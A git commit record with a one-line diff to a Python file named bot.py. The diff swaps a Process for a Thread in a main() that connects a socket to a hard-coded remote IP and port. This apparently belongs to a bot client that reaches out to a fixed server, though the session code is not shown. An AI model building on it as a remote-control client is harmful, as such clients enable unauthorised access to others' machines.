9e4a84dba59ad20f44d8f8918c72dabedfc072d1
devesh2003 <deveshthechamp@gmail.com>
2019-04-02 16:44:13 +0530

    rf4rf

--- bot.py
+++ bot.py
@@ -38,7 +38,7 @@ def start_session(s):
 def main():
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("142.93.197.240",2003))
-    conn_process = Process(target=start_session,args=(s,))
+    conn_process = Thread(target=start_session,args=(s,))
     conn_process.start()
 
 if __name__ == '__main__':
